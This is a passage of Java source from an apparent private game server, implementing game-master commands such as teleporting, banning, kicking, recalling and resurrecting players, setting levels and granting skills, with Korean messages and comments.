//				L1Teleport.teleport(pc , 32847, 32793, (short) 532, 5, true); // 라던4층
				pc.start_teleport(32847, 32793, 532, 5, 169, false, false);
			} else if (i == 48) {
//				L1Teleport.teleport(pc , 32843, 32693, (short) 550, 5, true); // 선박무덤
				pc.start_teleport(32843, 32693, 550, 5, 169, false, false);
			} else if (i == 49) {
//				L1Teleport.teleport(pc , 32781, 32801, (short) 558, 5, true); // 심해
				pc.start_teleport(32781, 32801, 558, 5, 169, false, false);
			} else if (i == 50) {
//				L1Teleport.teleport(pc , 32731, 32862, (short) 784, 5, true); // 제브
				pc.start_teleport(32731, 32862, 784, 5, 169, false, false);
			} else if (i == 51) {
//				L1Teleport.teleport(pc , 32728, 32704, (short) 4, 5, true); // 균열 1
				pc.start_teleport(32728, 32704, 4, 5, 169, false, false);
			} else if (i == 52) {
//				L1Teleport.teleport(pc , 32827, 32658, (short) 4, 5, true); // 균열 2
				pc.start_teleport(32827, 32658, 4, 5, 169, false, false);
			} else if (i == 53) {
//				L1Teleport.teleport(pc , 32852, 32713, (short) 4, 5, true); // 균열 3
				pc.start_teleport(32852, 32713, 4, 5, 169, false, false);
			} else if (i == 54) {
//				L1Teleport.teleport(pc , 32914, 33427, (short) 4, 5, true); // 균열 4
				pc.start_teleport(32914, 33427, 4, 5, 169, false, false);
			} else if (i == 55) {
//				L1Teleport.teleport(pc , 32962, 33251, (short) 4, 5, true); // 균열 5
				pc.start_teleport(32962, 33251, 4, 5, 169, false, false);
			} else if (i == 56) {
//				L1Teleport.teleport(pc , 32908, 33169, (short) 4, 5, true); // 균열 6
				pc.start_teleport(32908, 33169, 4, 5, 169, false, false);
			} else if (i == 57) {
//				L1Teleport.teleport(pc , 34272, 33361, (short) 4, 5, true); // 균열 7
				pc.start_teleport(34272, 33361, 4, 5, 169, false, false);
			} else if (i == 58) {
//				L1Teleport.teleport(pc , 34258, 33202, (short) 4, 5, true); // 균열 8
				pc.start_teleport(34258, 33202, 4, 5, 169, false, false);
			} else if (i == 59) {
//				L1Teleport.teleport(pc , 34225, 33313, (short) 4, 5, true); // 균열 9
				pc.start_teleport(34225, 33313, 4, 5, 169, false, false);
			} else if (i == 60) {
//				L1Teleport.teleport(pc , 32682, 32892, (short) 5167, 5, true); // 악마영토
				pc.start_teleport(32682, 32892, 5167, 5, 169, false, false);
			} else if (i == 61) {
//				L1Teleport.teleport(pc , 32862, 32862, (short) 537, 5, true); // 기르타스
				pc.start_teleport(32862, 32862, 537, 5, 169, false, false);
			} else if (i == 62) {
//				L1Teleport.teleport(pc , 32738, 32448, (short) 4, 5, true); // 화전민
				pc.start_teleport(32738, 32448, 4, 5, 169, false, false);
			} else if (i == 63) {
//				L1Teleport.teleport(pc , 32797, 32285, (short) 4, 5, true); // 오성수탑
				pc.start_teleport(32797, 32285, 4, 5, 169, false, false);
			} else if (i == 64) {
//				L1Teleport.teleport(pc , 33052, 32339, (short) 4, 5, true); // 요정숲
				pc.start_teleport(33052, 32339, 4, 5, 169, false, false);
			} else if (i == 65) {
//				L1Teleport.teleport(pc, 32738, 32872, (short) 2236, 5, true); // 서버지기아지트
				pc.start_teleport(32738, 32872, 2236, 5, 169, false, false);
			} else if (i == 66) {
				pc.start_teleport(32737, 32868, 2237, 5, 169, false, false);
			} else if (i == 67) {
				pc.start_teleport(32736, 32796, 16896, 5, 169, false, false);
			} else if (i == 68) {
				pc.start_teleport(32736, 32799, 38, 5, 169, false, false);
			} else if (i == 69) {
				pc.start_teleport(32769, 32827, 610, 5, 169, false, false);
			} else if (i == 70) {
					pc.start_teleport(32764, 32815, 5554, 5, 169, false, false);
			} else {
				L1Location loc = BuilderCmdConfig.ROOMS.get(arg.toLowerCase());
				if (loc == null) {
					SC_SystemMessage.send(pc, "\\f:==================<귀환 장소>===================");
					SC_SystemMessage.send(pc, "\\aA1.gm룸 2.기란 3.은말 4.오렌 5.웰던 6.글루딘 7.숨계");
					SC_SystemMessage.send(pc, "\\aA8.버경장 9.깃털말 10.말섬 11.상담소 12.벗꽃 13.낚시");
					SC_SystemMessage.send(pc, "\\aA14.켄트성 15.윈다성 16.기란성 17.하이성 18.아덴성");
					SC_SystemMessage.send(pc, "\\aA19.수호탑 20.수호탑 21.수호탑 22.수호탑 23.수호탑");
					SC_SystemMessage.send(pc, "\\f:24.해섬 25.베히모 26.실베리아 27.테베 28.피라미드");
					SC_SystemMessage.send(pc, "\\f:29.피라미드 30.피닉스 31.데몬 32.기감4층 33.마족방");
					//pc.sendPackets(new SC_SystemMessage("\\aD34.안타 35.파푸 36.린드 37.발라 38.구파푸 39.버모스"));
					SC_SystemMessage.send(pc, "\\f:40.정무 41.고라스 42.섬던2층 43.고대무덤 44.오땅");
					SC_SystemMessage.send(pc, "\\f:45.라던2층 46.라던3층 47.라던4층 48.선박 49.심해");
					SC_SystemMessage.send(pc, "\\f:50.제브레퀴 51~59.균열 60.악마영토 61.기르타스");
					SC_SystemMessage.send(pc, "\\aA62.화전민마을 63.오크성 64.요정숲 65.서버지기아지트");
					SC_SystemMessage.send(pc, "\\aA66.후원안내 67.VIP상담소 68.오토유저");
					SC_SystemMessage.send(pc, "\\aA69.후원문의1 70.후원문의2");
					return;
				}
//				L1Teleport.teleport(pc, loc.getX(), loc.getY(), (short) loc
//						.getMapId(), 5, true);
				pc.start_teleport(loc.getX(), loc.getY(), loc.getMapId(), 5, 169, false, false);
			}
			if (i > 0 && i < 33) {
				SC_SystemMessage.send(pc, "운영자 귀환(" + i + ")번으로 이동했습니다.");
			}
		} catch (Exception exception) {
			SC_SystemMessage.send(pc, ".귀환 [장소명]을 입력 해주세요.");
		}
	}

	private static void BuilderCmd_account_ban_kick(L1PcInstance pc, String cmdName, String arg) {
		try {
			StringTokenizer st = new StringTokenizer(arg);
			String				name	= st.nextToken();
			if(name == null || name.equalsIgnoreCase(""))
				throw new Exception("");
			
			int reason = SC_LoginResult.banServerCodes.get(Integer.parseInt(st.nextToken()));
			
			L1PcInstance target = CWorld.getInstance().getPlayer(name);
			if (target == null) {
				target = CharacterTable.getInstance().restoreCharacter(name);
			}

			if (target != null) { // 어카운트를 BAN 한다
				final CUserSocket clnt = target.getNetConnection();
				Account.ban(target.getAccountName(), reason);
				SC_SystemMessage.send(pc, target.getName() + " 를 계정압류 하였습니다.");
				SC_Disconnect.send(target);
				
				if (target.getOnlineStatus() == 1) {
					SC_Disconnect.send(target);
				}
				CWorldWork.scheduleRequired(new Runnable(){
					@Override
					public void run(){
						if(clnt != null && clnt.isConnected()){
							try {
								clnt.close();
							} catch (Exception e) {
								e.printStackTrace();
							}
						}
					}
				}, 1000L);
			} else {
				SC_SystemMessage.send(pc, "그러한 이름의 캐릭터는 월드내에는 존재하지 않습니다. ");
			}
		} catch (Exception e) {
			SC_SystemMessage.send(pc, ".계정압류 [캐릭터명] [압류사유번호] 으로 입력해 주세요.");
			SC_SystemMessage.send(pc, "[압류사유]: 1(고정). 미풍양속으로.. 그외 없음");
		}
	}

	private static void BuilderCmd_visible(L1PcInstance pc, String cmdName, String arg) {
		try {
			pc.setGmInvis(false);
			pc.killSkillEffectTimer(L1SkillId.INVISIBILITY);
			SC_Invis.send(pc, pc.getId(), 0);

			SC_WorldPutObject.broadcastPc(
					pc,
					"",
					false);

			SC_SystemMessage.send(pc, "투명상태를 해제했습니다. ");
		} catch (Exception e) {
			SC_SystemMessage.send(pc, cmdName + " 커멘드 에러");
		}
	}

	private static void BuilderCmd_recall(L1PcInstance pc, String cmdName, String arg) {
		try {
			Collection<L1PcInstance> targets = null;
			
			
			
			
			if (arg.equalsIgnoreCase("소환")) {
				targets = CWorld.getInstance().getAllPlayers();
			} else {
				targets = new ArrayList<L1PcInstance>();
				L1PcInstance tg = CWorld.getInstance().getPlayer(arg);
				if (tg == null) {
					SC_SystemMessage.send(pc, "그러한 캐릭터는 없습니다. ");
					return;
				}
				targets.add(tg);
			}

			try(var shared=new l1j.server.server.model.network.core.broadcast.CAsyncSendConstBuffer(
       SC_SystemMessage.nativeWriter("\\f:운영자님께서 당신을 소환 하였습니다."),Integer.MIN_VALUE,Integer.MAX_VALUE)) {
for (L1PcInstance target : targets) {
				

				
				
				if (target.isPrivateShop() || target.isAutoClanjoin() /*|| target.isAutoFish()*/) {
					SC_SystemMessage.send(pc, target.getName() + " 님은 상점모드 or 무인가입 중 입니다.");
					return;
				}
				if (pc.getMapId() == 5554) {
					SC_Ability.send(target, 3, true);
				}
				
				L1Location loc = L1Teleport.getInstance().소환텔레포트(pc, 1);
				target.start_teleportForGM(loc.getX(), loc.getY(), loc.getMapId(), target.getHeading(), 169, true, true);
				SC_SystemMessage.send(pc, "\\f:캐릭터: ["+target.getName()+"]님을 소환하였습니다. ");
				l1j.server.server.model.network.core.broadcast.CSharedBroadcast.sendRecipient(shared,target);
			}
}
			
		} catch (Exception e) {
			SC_SystemMessage.send(pc, cmdName + ".소환 캐릭터명 으로 입력해 주세요.]");
		}
	}

	private static void BuilderCmd_kick(L1PcInstance pc, String cmdName, String arg) {
		try {
			L1PcInstance target = CWorld.getInstance().getPlayer(arg);

			if (target != null) {
				SC_SystemMessage.send(pc, (new StringBuilder()).append(target.getName()).append(" 를 추방 했습니다. ").toString());
				L1ClanJoinInstance.ban_user(target);
				target.getNetConnection().kick();	//만일의 경우를 대비
				target.getNetConnection().close();	//만일의 경우를 대비
				SC_Disconnect.send(target);
			} else {
				SC_SystemMessage.send(pc, "그러한 이름의 캐릭터는 월드내에는 존재하지 않습니다. ");
			}
		} catch (Exception e) {
			SC_SystemMessage.send(pc, cmdName + " 캐릭명으로 입력. ");
		}
	}

	private static void BuilderCmd_show_loc(L1PcInstance pc, String cmdName, String arg) {
		try {
			
			int locx = pc.getX();
			int locy = pc.getY();
			short mapid = pc.getMapId();
			int gab = L1WorldMap.getInstance(). getMap(mapid).getOriginalTile(locx, locy);
			int g2 = L1WorldMap.getInstance().getMap(mapid).getTestTile(locx, locy);
			String msg = String.format("좌표 (%d, %d, %d) %d %d, %s", locx, locy, mapid, gab, g2, String.valueOf(L1WorldMap.getInstance().getMap(mapid).isPassable(locx, locy)));
			SC_SystemMessage.send(pc, msg);
			//pc.sendPackets(new SC_SystemMessage("타일번호: "+pc.getMap().getOriginalTile(locx, locy)));
			System.out.println(msg);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private static void BuilderCmd_move(L1PcInstance pc, String cmdName, String arg) {
		try {
			StringTokenizer st = new StringTokenizer(arg);
			int locx = Integer.parseInt(st.nextToken());
			int locy = Integer.parseInt(st.nextToken());
			short mapid;
			if (st.hasMoreTokens()) {
				mapid = Short.parseShort(st.nextToken());
			} else {
				mapid = pc.getMapId();
			}
//			L1Teleport.teleport(pc, locx, locy, mapid, 5, false);
			pc.do_simple_teleport(locx, locy, mapid);
			//pc.start_teleport(locx, locy, mapid, 5, 169, false, false);
			SC_SystemMessage.send(pc, "좌표 " + locx + ", " + locy
					+ ", " + mapid + "로 이동했습니다. ");
		} catch (Exception e) {
			SC_SystemMessage.send(pc, cmdName
					+ " [X좌표] [Y좌표] [맵ID] 라고 입력해 주세요. ");
		}
	}

	private static void BuilderCmd_invisible(L1PcInstance pc, String cmdName, String arg) {
		try {

			if (!pc.hasSkillEffect(L1SkillId.INVISIBILITY)) {
				pc.setGmInvis(true);
				SC_Invis.send(pc, pc.getId(), 1);
				SC_Invis.broadcast(pc, pc.getId(), 1);

				SC_RemoveObject.broadcast(pc);

				pc.setSkillEffect(L1SkillId.INVISIBILITY, 0);
			} else {
				pc.setGmInvis(false);
				pc.killSkillEffectTimer(L1SkillId.INVISIBILITY);
				SC_Invis.send(pc, pc.getId(), 0);

				SC_WorldPutObject.broadcastPc(pc);
			}

		} catch (Exception e) {
			SC_SystemMessage.send(pc, cmdName + " 커멘드 에러");
		}
	}

	private static void BuilderCmd_kill(L1PcInstance pc, String cmdName, String arg) {
		try {
			L1PcInstance target = CWorld.getInstance(). getPlayer(arg);
			if(pc.getName().equalsIgnoreCase(target.getName())) {
				SC_SystemMessage.send(pc, "본인은 죽일 수 없습니다.");
				return;
			}
			if(target.isGm()) {
				SC_SystemMessage.send(pc, "운영자는 죽일 수 없습니다.");
				return;
			}
			if (target != null) {
				target.setCurrentHp(0);
				target.death(null, true);
			}
		} catch (Exception e) {
			SC_SystemMessage.send(pc, cmdName + " [캐릭터명]으로 입력해 주세요. ");
		}
	}

	private static void BuilderCmd_to_pc(L1PcInstance pc, String cmdName, String arg) {
		try {
			L1PcInstance target = CWorld.getInstance(). getPlayer(arg);

			if (target != null) {

				 
				 
//				L1Teleport.teleport(pc, target.getX(), target.getY(), target
//						. getMapId(), 5, false);
				pc.start_teleport(target.getX(), target.getY(), target.getMapId(), 5, 169, false, false);
			} else {
				SC_SystemMessage.send(pc, (new StringBuilder())
						. append(arg). append(" : 해당 캐릭터는 없습니다. "). toString());
			}
		} catch (Exception e) {
			SC_SystemMessage.send(pc, cmdName + " [캐릭터명]으로 입력해 주세요. ");
		}
	}

	private static void BuilderCmd_echo(L1PcInstance pc, String cmdName, String arg) {
		SC_SystemMessage.send(pc, arg);
	}

	private static void BuilderCmd_action(L1PcInstance pc, String cmdName, String arg) {
		try {
			StringTokenizer st = new StringTokenizer(arg);
			int actId = Integer.parseInt(st.nextToken(), 10);
			SC_DoActionGFX.send(pc.getNetConnection(), pc.getId(), actId);
		} catch (Exception exception) {
			SC_SystemMessage.send(pc, cmdName + " [actid] 라고 입력해 주세요. ");
		}
	}

	private static void BuilderCmd_speed(L1PcInstance pc, String cmdName, String arg) {
		try {
			L1BuffUtil.haste(pc, 9999 * 1000);
			L1BuffUtil.brave(pc, 9999 * 1000);
		} catch (Exception e) {
			e.printStackTrace();
			SC_SystemMessage.send(pc, ".속도 커멘드 에러");
		}
	}




	private static void BuilderCmd_level(L1PcInstance pc, String cmdName, String poby) {
	    try {
	      StringTokenizer token = new StringTokenizer(poby);
	      String name = token.nextToken();
	      int level = Integer.parseInt(token.nextToken());

	      L1PcInstance target = CWorld.getInstance().getPlayer(name);
	      if (target == null) {
//	        pc.sendPackets(new SC_ServerMessage(73, new String[] { name }));
	    	SC_SystemMessage.send(pc, "해당 아이가 없습니다.");
	        return;
	      }

	      if (!IntRange.includes(level, 1, 127)) {
	        SC_SystemMessage.send(pc, "입력한 레벨이 범위를 벗어났습니다. (1~99)");
	        return;
	      }
	      int percent = 0;
	      if (token.hasMoreTokens()) {
	        percent = Integer.parseInt(token.nextToken());
	      }
	      if (!IntRange.includes(percent, 0, 127)) {
	        SC_SystemMessage.send(pc, "입력한 퍼센트가 범위를 벗어났습니다. (0~99)");
	        return;
	      }

	      int exp = ExpTable.getExpByLevel(level);
	      exp = (int)(exp + percent * 0.01D * ExpTable.getNeedExpNextLevel(level));
	      target.setExp(exp);
	      SC_SystemMessage.send(pc, "<레벨 변경> " + target.getName() + " - Lv. " + level + " / Exp. " + percent + "%");
	    } catch (Exception e) {
	      SC_SystemMessage.send(pc, "." + cmdName + " <캐릭터명> <레벨:1-127> <퍼센트:0-99>");
	    }
	  }

	private static void BuilderCmd_reload_trap(L1PcInstance pc, String cmdName, String arg) {
		L1WorldTraps.reloadTraps();
	}

	private static void BuilderCmd_reset_trap(L1PcInstance pc, String cmdName, String arg) {
		L1WorldTraps.getInstance(). resetAllTraps();
		SC_SystemMessage.send(pc, "트랩을 재배치했습니다");
	}

	private static void BuilderCmd_server_message(L1PcInstance pc, String cmdName, String arg) {
		try {
			StringTokenizer st = new StringTokenizer(arg);
			int ment = Integer.parseInt(st.nextToken(), 10);
			int count = Integer.parseInt(st.nextToken(), 10);

			for (int i = 0; i <= count; i++ ) {
				SC_ServerMessage.send(pc, ment + i);
				SC_SystemMessage.send(pc, "(" + (ment + i) +")번의 멘트는 위와 같습니다");
			}
		} catch (Exception e) {
			SC_SystemMessage.send(pc, ".메세지 [번호] [갯수]을 입력 해주세요.");
		}
	}

	private static void BuilderCmd_buff_icon(L1PcInstance pc, String cmdName, String arg) {
		try {
			StringTokenizer st = new StringTokenizer(arg);
			int _sprid = Integer.parseInt(st.nextToken(), 10);
			int count = Integer.parseInt(st.nextToken(), 10);
			for (int i = 0; i < count; i++) {
				try {					
					Thread.sleep(1000);
					int num = _sprid + i;
					SC_PacketBox.send(pc, SC_PacketBox.BUFFICON, _sprid + i, 10000, true, pc);
					SC_SystemMessage.send(pc, "무제한 아이콘 : "+num+" 번.");
				} catch (Exception exception) {
					break;
				}
			}
		} catch (Exception exception) {
			SC_SystemMessage.send(pc, cmdName
					+ " [id] [출현시키는 수]로 입력해 주세요. ");
		}
	}

	private static void BuilderCmd_gfx_id(L1PcInstance pc, String cmdName, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			int gfxid = Integer.parseInt(st.nextToken(), 10);
			int count = Integer.parseInt(st.nextToken(), 10);
			int loc_x = pc.getX();
			int loc_y = pc.getY();
			
			for (int i = 0; i < count; i++) {
				L1Npc l1npc = CObjectDB.GetNPC(45001);
				if (l1npc != null) {
					String s = l1npc.getImpl();
					Constructor<?> constructor = Class.forName("l1j.server.server.model.Instance." + s + "Instance").getConstructors()[0];
					Object aobj[] = { l1npc };
					L1NpcInstance npc = (L1NpcInstance) constructor.newInstance(aobj);
					npc.setId(IdFactory.getInstance().nextId());
					npc.setCurrentSprite(gfxid + i);
					npc.setNameId("" + (gfxid + i) + "");
					npc.setMap(pc.getMapId());
					
					int k = i % 5;
					if (k == 0 && i > 0) {
						loc_x -= 2;
						loc_y += 2;
					}
					npc.setX(loc_x + k * 2);
					npc.setY(loc_y + k * 2);
					
//					npc.setX(pc.getX() + i * 2);
//					npc.setY(pc.getY() + i * 2);
					npc.setHomeX(npc.getX());
					npc.setHomeY(npc.getY());
					npc.setHeading(5);
					npc.setStatus(0);
					CWorld.getInstance().storeAndEnterWorld(npc);
					
					BuilderCmdHandler.getInstance().add_list(npc);
				}
			}
		} catch (Exception exception) {
			SC_SystemMessage.send(pc, cmdName + " [id] [출현시키는 수]로 입력해 주세요. ");
		}
	}

	private static void BuilderCmd_inv_gfx_id(L1PcInstance pc, String cmdName, String arg) {
	    try {
	        StringTokenizer st = new StringTokenizer(arg);
	        int gfxid = Integer.parseInt(st.nextToken(), 10);
	        int count = Integer.parseInt(st.nextToken(), 10);
	        if(count <= 200){
	            Proto.send(pc, SC_WAREHOUSE_ITEM_LIST_NOTI.newDisplayInstance(pc.getId(), 0, gfxid, count, true));
	        }else{
	            int page = (count / 200) + ((count % 200) > 0 ? 1 : 0);
	            for(int i=0; i<page; ++i){
	                int real_index = i * 200;
	                Proto.send(pc, SC_WAREHOUSE_ITEM_LIST_NOTI.newDisplayInstance(pc.getId(), real_index, gfxid + real_index, 200, (i + 1 == page)));
	            }
	        }

	        SC_SystemMessage.send(pc, "\\aHInvGfxId " + gfxid + "~"
	                + String.valueOf(count) + " 생성 되었습니다.");
	    } catch (Exception exception) {
	        int count = 0;
	        for (L1ItemInstance item : pc.getInventory().GetItemListByClassID(40005)) {
	            pc.getInventory().Pop(item);
	            count++;
	        }
	        if (count > 0) {
	            SC_SystemMessage.send(pc, "\\aAInvGfxId 확인용 아이템("
	                    + count + ")이 삭제되었습니다.");
	        } else {
	            SC_SystemMessage.send(pc, "\\aH" + cmdName
	                    + " [InvGfxId] [갯수]로 입력해 주세요.");
	        }
	    }
	}

	private static void BuilderCmd_skill_icon(L1PcInstance pc, String cmdName, String arg) {
		try {
			StringTokenizer st = new StringTokenizer(arg);
			int _sprid = Integer.parseInt(st.nextToken(), 10);
			int count = Integer.parseInt(st.nextToken(), 10);
			for (int i = 0; i < count; i++) {
				try {					
					Thread.sleep(1000);
					int num = _sprid + i;
					SC_PacketBox.send(pc, SC_PacketBox.UNLIMITED_ICON1, _sprid+i, true);//무제한패킷
					SC_SystemMessage.send(pc, "무제한 아이콘 : "+num+" 번.");
				} catch (Exception exception) {
					break;
				}
			}
		} catch (Exception exception) {
			SC_SystemMessage.send(pc, cmdName
					+ " [id] [출현시키는 수]로 입력해 주세요. ");
		}
	}

	private static void BuilderCmd_chat_ban(L1PcInstance pc, String cmdName, String arg) {
		try {
			StringTokenizer st = new StringTokenizer(arg);
			String name = st.nextToken();
			int time = Integer.parseInt(st.nextToken());
//			String reason = st.nextToken();

			L1PcInstance tg = CWorld.getInstance(). getPlayer(name);

			if (tg != null) {
				tg.setSkillEffect(L1SkillId.STATUS_CHAT_PROHIBITED, time * 60 * 1000);
				SC_SkillIconGFX.send(tg, 36, time * 60);
				SC_SystemMessage.send(pc, name + " 채팅금지 : "+ String.valueOf(time) + "분 적용완료.");
//				tg.sendPackets(new SC_ServerMessage(286, String.valueOf(time))); // \f3게임에 적합하지 않는 행동이기 (위해)때문에, 향후%0분간 채팅을 금지합니다.
			} else {
				SC_SystemMessage.send(pc, "해당 캐릭터 미접속.");
			}
		} catch (Exception e) {
			SC_SystemMessage.send(pc, cmdName + " [캐릭명] [분] 입력.");
		}
	}

	private static void BuilderCmd_world_chat(L1PcInstance pc, String cmdName, String arg) {
		try {
			StringTokenizer st = new StringTokenizer(arg);
			if (st.hasMoreTokens()) {
				String flag = st.nextToken();
				String msg;
				if (flag.compareToIgnoreCase("켬") == 0) {
					CWorld.getInstance(). set_worldChatElabled(true);
					msg = "월드 채팅을 유효하게 했습니다. ";
				} else if (flag.compareToIgnoreCase("끔") == 0) {
					CWorld.getInstance(). set_worldChatElabled(false);
					msg = "월드 채팅을 정지했습니다. ";
				} else {
					throw new Exception();
				}
				SC_SystemMessage.send(pc, msg);
			} else {
				String msg;
				if (CWorld.getInstance(). isWorldChatElabled()) {
					msg = "현재 월드 채팅은 유효합니다.. 채팅 끔 로 정지할 수 있습니다. ";
				} else {
					msg = "현재 월드 채팅은 정지하고 있습니다.. 채팅 켬 로 유효하게 할 수 있습니다. ";
				}
				SC_SystemMessage.send(pc, msg);
			}
		} catch (Exception e) {
			SC_SystemMessage.send(pc, cmdName + " [켬, 끔]");
		}
	}

	private static void BuilderCmd_ress(L1PcInstance pc, String cmdName, String arg) {
		try {
			int objid = pc.getId();
			//pc.sendPackets(new S_SkillSound(objid, 759));
			//pc.broadcastPacket(new S_SkillSound(objid, 759));
			try(var askShared=new l1j.server.server.model.network.core.broadcast.CAsyncSendConstBuffer(
SC_MessageYN.nativeWriter(322,""),Integer.MIN_VALUE,Integer.MAX_VALUE)) {
for (L1PcInstance tg : CWorld.getInstance(). getVisiblePlayer(pc)) {
				if (tg.getCurrentHp() == 0 && tg.isDead()) {
					//tg.sendPackets(new SC_SystemMessage("GM이 부활을 해주었습니다. "));
					SC_SkillSound.broadcast(tg, tg.getId(), 3944);
					SC_SkillSound.send(tg, tg.getId(), 3944);
					// 축복된 부활 스크롤과 같은 효과
					tg.setTempID(objid);
					l1j.server.server.model.network.core.broadcast.CSharedBroadcast.sendRecipient(askShared,tg); // 또 부활하고 싶습니까? (Y/N)
				} else {
					//tg.sendPackets(new SC_SystemMessage("GM이 HP,MP를 회복해주었습니다."));
					SC_SkillSound.broadcast(tg, tg.getId(), 832);
					SC_SkillSound.send(tg, tg.getId(), 832);
					tg.setCurrentHp(tg.getMaxHp());
					tg.setCurrentMp(tg.getMaxMp());
				}
			}
}
		} catch (Exception e) {
			SC_SystemMessage.send(pc, cmdName + " 커멘드 에러");
		}
	}

	private static void BuilderCmd_gm_question(L1PcInstance pc, String cmdName, String arg) {
		try{
			if(L1Question.mainstart){
				SC_SystemMessage.send(pc, "현재 설문조사가 진행중입니다.");
				SC_SystemMessage.send(pc, "진행중인 설문 내용 : " + L1Question.maintext);
			}
			L1Question.getInstance(arg);
		}catch(Exception e){
			SC_SystemMessage.send(pc, ".설문 [설문내용] 을 입력 해주세요");
		}
	}

	private static void BuilderCmd_summon_set_item(L1PcInstance pc, String cmdName, String arg) {
		List<L1ItemSetItem> list = BuilderCmdConfig.ITEM_SETS.get(arg.trim());
		if (list == null || list.isEmpty()) { SC_SystemMessage.send(pc, ".세트아이템 [세트명]"); return; }
		CUserSocket socket = pc.getNetConnection();
		int stamp = pc.getSessionStamp();
		builderOnItemOwner(pc, pc, () -> {
			try (var tx = builderItemTransaction(pc)) {
				for (L1ItemSetItem item : list)
					builderStageGrant(tx, CObjectDB.GetItem(item.getId()), item.getAmount(), item.getEnchant(), 0, 0);
				tx.onTerminalFailure(() -> builderReply(pc, socket, stamp, "세트 지급 DB 결과 확인 필요. 재지급하지 마십시오."));
				tx.commit(() -> builderReply(pc, socket, stamp, "세트아이템 지급 완료"));
			}
		});
	}

	private static void BuilderCmd_show_trap(L1PcInstance pc, String cmdName, String arg) {
		if (arg.equalsIgnoreCase("켬")) {
			pc.setSkillEffect(L1SkillId.GMSTATUS_SHOWTRAPS, 0);
		} else if (arg.equalsIgnoreCase("끔")) {
			pc.removeSkillEffect(L1SkillId.GMSTATUS_SHOWTRAPS);

			for (L1Object obj : pc.getKnownObjects()) {
				if (obj instanceof L1TrapInstance) {
					pc.removeKnownObject(obj);
					SC_RemoveObject.send(
							pc.getNetConnection(),
							obj);
				}
			}
		} else {
			SC_SystemMessage.send(pc, cmdName + " [켬,끔] 라고 입력해 주세요. ");
		}
	}

	private static void BuilderCmd_thread(L1PcInstance pc, String cmdName, String arg) {
		try {
			Thread[] th = new Thread[Thread.activeCount()];
			Thread.enumerate(th); 
			for(int i=0; i<th.length; i++){
			SC_SystemMessage.send(pc, "["+i+"] 사용 쓰레드 : [" + th[i]+"]");
			}
			SC_SystemMessage.send(pc, "현재 사용되는 쓰레드 갯수 : ["+Thread.activeCount()+"]");

		} catch (Exception e) {
			SC_SystemMessage.send(pc, cmdName + "갯수 라고 입력 바랍니다.");
		}
	}

	private static void BuilderCmd_add_skill(L1PcInstance gm, String cmdName, String arg) {
		try {
			int cnt = 0; // 루프 카운터
			String skill_name = ""; // 스킬명
			int skill_id = 0; // 스킬 ID
			
			StringTokenizer st = new StringTokenizer(arg);
			String charname = st.nextToken();
			L1PcInstance pc = CWorld.getInstance().getPlayer(charname);
			
			if(pc == null)
				SC_SystemMessage.send(gm, "경고: 접속중 캐릭터가 아닙니다.");
			int object_id = pc.getId(); // 캐릭터의 objectid를 취득
			SC_SkillSound.send(pc, object_id, '\343'); // 마법 습득의 효과음을 울린다
			SC_SkillSound.broadcast(pc, object_id, '\343');
			ArrayList<PassiveInfo> passives = null;
			if (pc.isCrown()) {
				passives = PassiveLoader.getInstance().fromClassType(0);
				SC_AddSkill.send(pc, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
				L1Skills l1skills = null;

				for (cnt = 1; cnt <= 16; cnt++) { // LV1~2 마법
					l1skills = SkillsTable.getInstance().getTemplate(cnt); // 스킬 정보를 취득
					if(l1skills == null)
						continue;
					
					skill_name = l1skills.getName();
					skill_id = l1skills.getSkillId();
					SkillsTable.getInstance().spellMastery(object_id, skill_id, skill_name, 0, 0); // DB에 등록
				}

				for (cnt = 113; cnt <= 122; cnt++) {// 프리 마법
					l1skills = SkillsTable.getInstance().getTemplate(cnt); // 스킬 정보를 취득
					if(l1skills == null)
						continue;
					
					skill_name = l1skills.getName();
					skill_id = l1skills.getSkillId();
					SkillsTable.getInstance().spellMastery(object_id, skill_id, skill_name, 0, 0); // DB에 등록
				}
			} else if (pc.isKnight()) {
				passives = PassiveLoader.getInstance().fromClassType(1);
				SC_AddSkill.send(pc, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 192, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
				L1Skills l1skills = null;

				for (cnt = 1; cnt <= 8; cnt++) {// LV1 마법
					l1skills = SkillsTable.getInstance().getTemplate(cnt); // 스킬 정보를 취득
					if(l1skills == null)
						continue;
					
					skill_name = l1skills.getName();
					skill_id = l1skills.getSkillId();
					SkillsTable.getInstance().spellMastery(object_id, skill_id, skill_name, 0, 0); // DB에 등록
				}

				for (cnt = 87; cnt <= 94; cnt++) {// 나이트 마법
					l1skills = SkillsTable.getInstance().getTemplate(cnt); // 스킬 정보를 취득
					if(l1skills == null)
						continue;
					
					skill_name = l1skills.getName();
					skill_id = l1skills.getSkillId();
					SkillsTable.getInstance().spellMastery(object_id, skill_id, skill_name, 0, 0); // DB에 등록
				}
				if (!pc.hasSkillEffect(L1SkillId.프라이드)) {
					pc.프라이드(true);
					pc.setSkillEffect(L1SkillId.프라이드, -1);
				
				}
				if (!pc.hasSkillEffect(L1SkillId.솔리드캐리지)) {
					pc.솔리드캐리지(true);
					pc.setSkillEffect(L1SkillId.솔리드캐리지, -1);
				
				}
			} else if (pc.isElf()) {
				passives = PassiveLoader.getInstance().fromClassType(2);
				SC_AddSkill.send(pc, 255, 255, 127, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 127, 3, 255, 255, 255, 255, 0, 0, 0, 0, 0,
						0, 0, 0, pc.getElfAttr());
				L1Skills l1skills = null;

				for (cnt = 1; cnt <= 48; cnt++) {// LV1~6 마법
					l1skills = SkillsTable.getInstance().getTemplate(cnt); // 스킬 정보를 취득
					if(l1skills == null)
						continue;
					
					skill_name = l1skills.getName();
					skill_id = l1skills.getSkillId();
					SkillsTable.getInstance().spellMastery(object_id, skill_id, skill_name, 0, 0); // DB에 등록
				}

				for (cnt = 129; cnt <= 176; cnt++) {// 에르프 마법
					l1skills = SkillsTable.getInstance().getTemplate(cnt); // 스킬 정보를 취득
					if(l1skills == null)
						continue;
					
					skill_name = l1skills.getName();
					skill_id = l1skills.getSkillId();
					SkillsTable.getInstance().spellMastery(object_id, skill_id, skill_name, 0, 0); // DB에 등록
				}
			} else if (pc.isWizard()) {
